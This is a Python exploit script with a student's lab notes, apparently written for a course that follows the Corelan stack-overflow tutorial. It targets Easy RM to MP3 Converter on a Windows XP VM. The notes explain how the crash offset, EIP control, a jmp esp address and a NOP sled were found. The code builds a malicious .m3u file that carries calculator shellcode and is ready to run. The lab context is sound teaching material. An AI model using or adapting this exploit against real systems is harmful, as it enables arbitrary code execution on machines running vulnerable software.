#!C:\python27\python.exe

'''
This is a starting file for the Corelan Exploit tutorial which can be found here:
https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

Steps to get started:
1) Create a Windows XP VM (obtain VMware license as necessary)
	a) key in windows_xp.txt
	b) do install vmware tools
2) Install software
	a) python-2.7.4 -- make sure to add this to the path for simplicity
	b) notepad++ 6.6 (if you want it -- I use it for the tutorial)
	c) immunity debugger 1.85
	4) mona (see readme for instructions)
	e) EasyRMtoMP3Converter -- you'll want to unzip this hostside, then copy it over
C) Copy the exploit_start.py script (this file) to your VM
4) TAKE A SNAPSHOT OF YOUR VM. Trust me on this, life will be better if you do.
	a) it is faster to do this if your VM is powered down, but it will work either way.
	2) if you do snapshot with it on, do be kind, and leave it alone while it's doing its work.

Some notes:
[]The tutorial uses windbg + metasploit + perl
[]We will use immunity + mona + python
[]We are running this on an old XP VM.
[]The versions of python and notepad++ are the latest that run on such an old platform
[]If you don't know how to edit the system path, just ask when we get started. Likely you're not alone.
'''

# Carson Pemble
# 2/4/20

'''
First you start by running the python script “exploit_start” and it creates a m3u file with 10,000 As in it.
I changed the number of As that the program produced until I found out that the max number of A’s you can spam is 26,067 before the application will just crash.

This allows me to know that if I create a string of 26,067 A’s followed by 4 B’s then the $eip will point to “42424242”.
The next characters in the string would then fill the $esp. Next, I filled the string with a bunch of C’s.

After doing this I noticed that it looks like the first C List starts at 000FF754 but the $esp is at 000FF758.
So I filled this gap with a string of 4 X’s, and then after that  is where I want to put my shell code.

At this point I have control over the $eip and where it points.
I have an area where I can write my code, and I have a register that points directly at my code, at 000FF758.

I can now overwrite $eip with 000FF758 and put 25 NOP’s, a break, and then more NOP’s. T
his should cause the program to jump to 000FF758 which contains NOP’s causing the program to slide until the break.
I try to do this by importing the struct library and using “struct.pack(‘<I’, 0x000FF758)”, but this doesn’t work because you can’t just overwrite the $eip with a  direct memory address as this is not reliable.
This means we should find a “jump esp” instruction within one of the dll files on the machine and use that to jump to our code.

This is where you can use Mona.py to help with the command “!mona jmp -r”.
This brings up 78 pointers and we want to slim that down to the RMtoMP3 applications .dlls.
We can use the view tab to find the executable modules and look for our .dll module there.

Once loaded into the CPU main thread, you can search for a jmp esp command. I found one at “0x01a8f23a”.

Now you can see that it is running our “shellcode” of 25 NOPs and then a place for it to crash.

Now all I have to do is replace the break and second group of NOPs with some real shellcode and it will be executed just as I expect it to.
I will now have control over the machine to execute whatever code I want.

Have it run the calculator shellcode and TADA!	THE CALCULATOR!!	* Applause *

'''

import struct

def main():

	out = open('crash.m3u','w')				# Create a file and call it crash.m3u
	junk = 'A' * 26067						# Overflow with junk
	eip = struct.pack('<I', 0x01A8F23A)		# Found a jmp esp instruction:  01A8F23A   FFE4		JMP ESP
	shellCodeNOP = "\x90" * 25				# NOPs to slide

	shellcodeCALC = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"

	write_string = junk + eip + shellCodeNOP + shellcodeCALC	# Concatenate to one string
	out.write(write_string)					# Write out to the file
	out.close()								# Close said file


if __name__ == '__main__':
	main()
